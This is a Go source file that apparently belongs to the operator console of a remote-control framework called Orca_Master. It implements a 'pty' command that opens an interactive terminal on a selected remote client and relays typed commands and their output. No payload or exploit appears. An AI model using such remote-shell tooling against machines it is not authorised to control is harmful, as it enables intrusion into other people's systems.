package controller

import (
	"Orca_Master/cli/cmdopt/ptyopt"
	"Orca_Master/cli/common"
	"Orca_Master/define/colorcode"
	"Orca_Master/define/retcode"
	"bytes"
	"fmt"
	"github.com/desertbit/grumble"
	"os"
	"os/signal"
	"time"
)

// 执行可交互式终端命令 (linux)
var ptyCmd = &grumble.Command{
	Name:  "pty",
	Help:  "execute interactive terminal commands",
	Usage: "pty [-h | --help]",
	Run: func(c *grumble.Context) error {
		if SelectId == -1 {
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "please select the id first")
			return nil
		}

		// 退出信号
		var sig os.Signal
		sigChan := make(chan os.Signal)
		signal.Notify(sigChan)

		// 发送执行pty消息
		retData := ptyopt.SendExecPtyMsg(SelectClientId)
		if retData.Code != retcode.SUCCESS {
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "pty request failed")
			return nil
		}
		select {
		case msg := <-common.ExecPtyMsgChan:
			_, _, decData := common.SettleRetData(msg)
			fmt.Print(decData)
		case <-time.After(10 * time.Second):
			return fmt.Errorf("request timed out")
		}

		var data []byte
		for {
			input := [512]byte{}
			os.Stdin.Read(input[:])
			data = bytes.Replace(input[:], []byte{13, 10}, []byte{10, 00}, -1) // 将windows\r\n替换为linux的\n
			data = bytes.Trim(data, "\x00")
			cmd := string(data)
			retData = ptyopt.SendCommandToPty(SelectClientId, cmd)
			if retData.Code != retcode.SUCCESS {
				colorcode.PrintMessage(colorcode.SIGN_FAIL, "command send failed")
				return nil
			}
			if cmd == "exit\n" {
				fmt.Println("exit pty")
				return nil
			}
			select {
			case msg := <-common.ExecPtyMsgChan:
				_, _, decData := common.SettleRetData(msg)
				fmt.Print(decData)
			case <-time.After(10 * time.Second):
				colorcode.PrintMessage(colorcode.SIGN_FAIL, "request timed out")
				return nil
			case sig = <-sigChan:
				if sig == os.Interrupt {
					ptyopt.SendCommandToPty(SelectClientId, "exit\n")
					colorcode.PrintMessage(colorcode.SIGN_NOTICE, "Pty Interrupt")
					return nil
				}
			}
		}
	},
}
